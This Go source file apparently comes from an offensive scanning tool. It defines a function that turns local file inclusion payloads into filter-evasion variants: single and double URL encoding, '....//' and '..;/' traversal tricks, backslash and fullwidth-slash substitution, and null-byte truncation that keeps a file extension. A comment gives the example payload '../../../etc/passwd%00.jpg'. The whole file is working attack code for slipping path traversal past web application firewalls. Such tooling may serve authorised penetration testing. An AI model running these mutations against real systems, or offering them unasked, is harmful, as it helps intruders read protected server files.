package mutations

import (
	"net/url"
	"strings"
)

// GetMutations generates WAF bypass variations for a given LFI payload.
// If an extension is provided, it is preserved after null byte injection (e.g., ../../../etc/passwd%00.jpg).
func GetMutations(payload string, originalExt string) []string {
	muts := []string{
		// --- Baseline ---
		payload, // Raw, unmodified payload

		// --- URL Encoding ---
		url.QueryEscape(payload),                  // Single URL encode
		url.QueryEscape(url.QueryEscape(payload)), // Double URL encode

		// --- Path Filter Bypass ---
		strings.ReplaceAll(payload, "../", "....//"),

		// --- Backslash Bypass ---
		strings.ReplaceAll(payload, "/", "\\"),

		// --- Semicolon Separator Bypass ---
		strings.ReplaceAll(payload, "../", "..;/"),

		// --- Unicode Fullwidth Slash ---
		strings.ReplaceAll(payload, "/", "%ef%bc%8f"),
	}

	// --- Null Byte with Extension Preservation ---
	if originalExt != "" {
		// Terminate with null byte but keep the required extension for WAF/server bypass
		muts = append(muts, payload+"%00"+originalExt)
	} else {
		muts = append(muts, payload+"%00")
	}

	return muts
}
